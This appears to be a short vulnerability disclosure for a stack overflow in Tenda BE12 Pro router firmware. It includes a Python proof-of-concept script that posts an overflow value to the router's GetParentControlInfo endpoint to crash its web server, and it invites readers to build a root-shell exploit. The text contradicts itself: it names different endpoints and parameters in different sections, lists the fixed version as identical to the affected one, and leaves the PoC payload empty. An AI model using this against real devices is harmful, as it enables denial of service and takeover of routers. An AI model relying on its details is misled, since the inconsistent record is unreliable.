# Affected Version
Tenda BE12 Pro V16.03.66.23
# Fixed Version
Tenda BE12 Pro V16.03.66.23
# Vulnerability Description
Tenda BE12 Pro V16.03.66.23 was discovered to contain a stack overflow via parameter macFilterType and parameter deviceList at url /goform/setMacFilterCfg.

# Firmware download address
https://www.tendacn.com/material/show/810284475428933


# Vulnerability Details
In function GetParentControlInfo line 24, src is a a user-controlled parameter(‘mac’) and is read in without length check.Then in line 27, the content of src is copied into local variable s+2, which leads to a stack overflow vulnerbility.
![](https://github.com/peris-navince/founded-0-days/blob/main/BE12PRO/GetParentControlInfo/1.png)


As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution with carefully crafted overflow data.

# Recurring vulnerabilities and POC
By sending delicately constructed data package as the poc above, we can cause a stack overflow error, leading to the crash of httpd process.
<pre>
import requests
    
host = "192.168.88.132"
cyclic = b""     

def exploit_GetParentControlInfo():
    url = f"http://{host}/goform/GetParentControlInfo"
    data = {
        b'mac':cyclic
    }
    res = requests.post(url=url,data=data)
    print(res.content)

exploit_GetParentControlInfo()
</pre>


And you can write your own exp to get the root shell.
